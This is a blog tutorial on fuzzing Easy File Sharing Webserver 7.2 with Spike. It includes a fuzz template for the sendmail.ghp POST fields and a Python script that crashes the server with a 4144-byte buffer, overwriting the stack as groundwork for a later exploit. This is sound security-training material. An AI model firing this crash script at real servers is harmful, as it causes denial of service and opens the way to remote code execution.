---
title:  "Fuzzing with Spike"
date:   2018-04-10 15:04:23
categories: BoF, Fuzzing
tags: BoF, Fuzzing, Spike
---

There has always been something about buffer overflows that to me has been what hacking is all about. There is something
magical about sending a string of characters and forcing a system to do your bidding. Hacking in its purest form!

During the next few posts we are going to do just that. We are going to go from discovering a vulnerability all the way 
to exploit development, starting with a basic vanilla stack overflow (and a few twists), getting fancier with subsequent posts. Having said that, 
This is not a beginner friendly tutorial - you should have at least a basic grasp of memory layouts (and a very basic 
grasp of C woudnt hurt!). We are going to be focusing on Intel x86 processors, with a Windows operating system (touching
on linux at some point...)
If you havent already, i strongly recommend reading Aleph One's famous [Smashing the Stack for Fun and Profit](http://www-inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf)

With that out of the way, lets begin! Today we are going to be 'discovering' a vulnerability and using the PoC as a basis for writing an exploit
for Easy File Sharing Webserver 7.2 down the road. I chose this software because 1) it is a simple remote unauthenticated example
of a stack overflow and 2) there are a few different ways we can hit this target. I did NOT discover this vulnerability, 
but we are going to approach it from an 0day angle and write a fuzzer to find it. This will be an overly simplistic approach to fuzzing and 0day discovery but it
should illustrate the basic steps you need to go through.

If you'd like to follow along, install the above software on a Windows 7 Professional (x86) system. You will also need
to install a windows debugger. For this post I will use Immunity with the mona.py script. Make sure port 80 is reachable
from your attacking system.

The first thing we'd wana do is get to know the software. We are looking to find out how it works, what kind of input
it takes, what protocol it uses, what it does, etc. In this case we know the software is a webserver, so
we would use a web proxy such as burp and browse the application. Note that any field that takes user input could be a point of interest - It is our job
to find that one oversight, that one unsanitized or unchecked parameter being passed into system(), strcpy(), sprintf(),
etc.In the case of a web server, some of the parameters of interest in would be custom headers, cookie
fields, or any user supplied/controlled data passed to the application.

The particular vulnerability we are going to be exploiting today was found in the following POST request:

`POST /sendmail.ghp HTTP/1.1`  
`Email=test@crash.com&getPassword=Get+Password`

The `Email` and `getPassword` parameters look promising, so lets write a template to fuzz these. Fuzzing is the process
by which we purposely send malformed requests of different input and study how the applciation responds. 
The fuzzer we are going to use today is the Spike fuzzer. Spike is a great tool which allows us to create templates 
based on the sort of data we are looking to send. We can then send both TCP or UDP packets containing the malformed data,
depending on what we are fuzzing. In this case, we are going to send a wide range of strings into the fields above.

The tempalte we will use will look like the one below:

``` ruby
s_string("POST /sendmail.ghp HTTP/1.1 \r\n");
s_string("Email=");
s_string_variable("test@crash.com");
s_string("&getPassword=");
s_string_variable("Get+Password");
s_string("\r\n\r\n");
```
Copy paste the above template and save it as EFS.spk. To explain:

The first line, `s_string()` sends data of type string that is static. In the above example, we are sending a POST request to sendmail.ghp.
If we however wanted to fuzz the POST parameter, or the /sendmail.ghp, we would use the s_string_variable() definition.
This tells spike which variables we would like to fuzz, and it is here where all the malformed data will be sent.

In the above example we are dealing with strings in an HTTP request. Spike also supports other data types such as binary,
but for this example we'll keep it simple and stick to strings.

Ok, now we are ready to test! We are going to use the generic_send_tcp program (part of Spike) as we are going to be sending TCP packets.
The command's format is the following:

`generic_send_tcp 192.168.56.101 80 EFS.spk 0 0`

While most of the parameters above should be self explanatory, the last two tell spike which variable and which test
to start from. In this case we want spike to test all the variables in the template using all the payloads, so we'll
start at 0 for both.

On your Windows VM, start the Easy File Web Server, and launch Immunity. Attach the process by going to
file > Attach > fsws > click Attach. You will then need to click the play button above twice to resume program
execution.

We will also use wireshark to monitor which payloads are sent to the windows machine. With wireshark running,
it is now time to fuzz the application. Open a separate terminal and launch the fuzzer. We notice that almost
immediately the application crashes! This looks promising. We stop Spike and look in wireshark to determine which payload
crashed the application. We see the following:

![Wireshark payloads]({{ "/images/Fuzz/Wireshark-fuzz.png" | absolute_url }})

If we look at Spike, it tells us the second request sent a payload of 5004 bytes. Lets explore this crash a bit more and see
if it is indeed exploitable. Remember that not every crash is exploitable, for a wide variety of reasons.

We will use the following python script as a baseline for our exploit:

``` ruby
#!/usr/bin/python

import socket
import sys

if len(sys.argv) < 2:
	print "Usage: python EFS.py [IP]\n"
	print "i.e python  EFS.py 192.168.56.101\n"
	exit(1)


crash = "A" *  4144

buffer  ="POST /sendmail.ghp HTTP/1.1 \r\n" 
buffer +="Email=" + crash + "&getPassword=Get+Password"

EFS = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
EFS.connect((sys.argv[1], 80))
EFS.send(buffer)
EFS.close()
```

Before we continue, some of you may have noticed I've adjusted the payload length to 4144. This was done by playing
with the buffer length to more easily demonstrate the basics of exploit development. In post number 3 we will come back to the original payload length and 
cover Safe Exception Handler (SEH) exploit development.

If we fire the above at our server, our application crashes, and immunity shows us the following:

![We have an overwrite]({{ "/images/Fuzz/immunity-fuzz-crash.png" | absolute_url }})

Success! it looks like we found a pretty straight forward exploitable flaw.

In the next post, we will cover exploit development for this particular vulnerability, using the above skeleton exploit
as a starting point.

